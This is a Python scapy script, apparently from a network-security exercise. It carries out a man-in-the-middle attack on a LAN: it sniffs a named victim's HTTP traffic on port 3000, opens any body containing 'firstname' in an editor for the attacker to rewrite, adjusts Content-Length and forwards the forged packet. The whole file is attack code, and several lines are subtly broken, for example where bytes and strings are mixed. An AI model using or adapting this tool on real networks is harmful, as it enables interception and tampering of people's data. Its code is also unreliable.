from time import sleep
from scapy.all import *
from scapy.layers.inet import IP, TCP, getmacbyip
from scapy.layers.http import HTTPRequest, HTTPResponse
import html
import click

# Define the victim's IP address.
victim_ip = "192.168.3.100"
hacker_ip = "192.168.3.101"
router_ip = "192.168.3.104"

# Dictionary to store TCP streams.
http_responses = {}

# Define network information.
router_mac = getmacbyip(router_ip)  # "10:be:f5:d5:57:90"

def packet_handler(packet):
    shwmsg = False
    if packet.haslayer(IP):
        if packet[IP].src == victim_ip and packet[IP].dst == router_ip:
            shwmsg = True
            print("PACKET CAPTURED FROM VICTIM")
            packet = packet_callback(packet)

        elif packet[IP].src == router_ip:
            shwmsg = True
            print("PACKET CAPTURED FROM WEBSERVER")
            packet = packet_sendtrough(packet)

    # Send the modified packet back to the victim.
    send(packet, verbose=False)
    if shwmsg:
        print(f"Forwarded packet from {packet[IP].src} to {packet[IP].dst}")
        print("=====================================================")
    return

def format_html(html_content):
    # Use html.unescape to handle HTML entities for better readability.
    return html.unescape(html_content)

def modify_packet(packet):

    if packet.haslayer(TCP):
        tcp = packet[TCP]
        stream_index = (tcp.sport, tcp.dport, tcp.seq, tcp.ack)

        # Reassemble TCP stream.
        if stream_index not in http_responses:
            http_responses[stream_index] = b""

        if packet.haslayer(Raw):
            payload = packet[Raw].load
            http_responses[stream_index] += payload

            try:
                # Attempt to decode and find the HTTP response in the reassembled stream.
                payload_decoded = http_responses[stream_index].decode(errors='ignore')
                headers_end_idx = payload_decoded.find('\r\n\r\n')
                if headers_end_idx != -1:
                    entity_body = payload_decoded[headers_end_idx + 4:]
                    # Format and print HTML content.
                    formatted_entity_body = format_html(entity_body)
                    if "firstname" in formatted_entity_body:
                        print(payload_decoded)
                        print(payload_decoded[:headers_end_idx + 4])
                        new_entity_body = click.edit(formatted_entity_body, editor='notepad')
                        #new_entity_body = '{"firstname": "Luigi", "lastname": "Mangione", "phone": "0487681256", "email": "hacker@gmail.com", "password": "muhahaha"}'
                        headers_content_length_idx = payload_decoded.find('Content-Length:')
                        new_input = str(len(new_entity_body) - 1)
                        print(new_input)
                        input_idx = 0
                        inshallah = True

                        while inshallah:
                            if payload_decoded[headers_content_length_idx].isnumeric() == True:
                                if input_idx < len(new_input):
                                    payload_decoded = payload_decoded.replace(payload_decoded[headers_content_length_idx], str(new_input[input_idx]))
                                    input_idx += 1
                                    headers_content_length_idx += 1
                                else:
                                    payload_decoded.replace(payload_decoded[headers_content_length_idx], "")
                            elif payload_decoded[headers_content_length_idx] == "\n":
                                inshallah = False
                            else:
                                headers_content_length_idx += 1

                        # Modify packet payload with new HTML content.
                        print(payload_decoded[:headers_end_idx + 4])
                        new_payload = f"{payload_decoded[:headers_end_idx + 4].encode()} + \n + {new_entity_body.encode()}"
                        print("Dit is de info van de victim:" + packet[Raw].load)
                        print("Dit is de info van de attacker:" + new_payload)
                        packet[Raw].load = new_payload
                        print("Dit is wat er wordt doorgezonden:" + packet[Raw].load)
                    else:
                        packet[Raw].load = payload_decoded

                    # Clear the stored response after printing.
                    del http_responses[stream_index]

                    http_responses[stream_index] = b""

                    # Recalculate checksums.
                    del packet[IP].chksum
                    del packet[TCP].chksum

                    # Recreating the checksums to make the packet seem valid.
                    packet[IP].chksum = None
                    packet[TCP].chksum = None

                    print(packet[Raw].load)

                    return packet

                else:
                    print("Headers end not found in payload.")
                    print(payload_decoded)
                    return packet
            except UnicodeDecodeError as e:
                print(f"Decoding error: {e}")
    return packet

def packet_callback(packet):

    # Modify the packet's destination to the webserver IP.
    packet[IP].dst = router_ip
    if packet.haslayer(TCP):
        packet = modify_packet(packet)

    return packet

def packet_sendtrough(packet):

    # Modify the packet's destination to the victim IP.
    packet[IP].dst = victim_ip

    return packet

# Sniff packets on the network and use packet_callback to process them.
if __name__ == "__main__":
    while True:
        sniff(prn=packet_handler, filter='tcp port 3000', store=0)

        time_sleep = 2
        sleep(time_sleep)
